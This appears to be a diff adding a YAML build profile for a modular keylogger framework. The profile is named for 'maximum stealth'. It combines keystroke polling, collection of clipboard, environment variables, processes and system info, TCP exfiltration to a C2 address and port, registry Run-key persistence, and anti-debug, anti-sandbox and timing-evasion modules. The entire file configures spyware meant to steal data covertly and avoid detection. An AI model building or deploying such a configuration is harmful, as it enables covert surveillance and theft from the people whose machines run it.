@@ -1,0 +1,30 @@
+name: keylogger_stealth_max
+description: Maximum stealth keylogger — heavy evasion, zero child processes, persistence
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/env_vars
+  - collectors/startup_items
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+persist: persist/registry_run
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+  - evasion/triggered_exec
+  - evasion/anti_debug
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
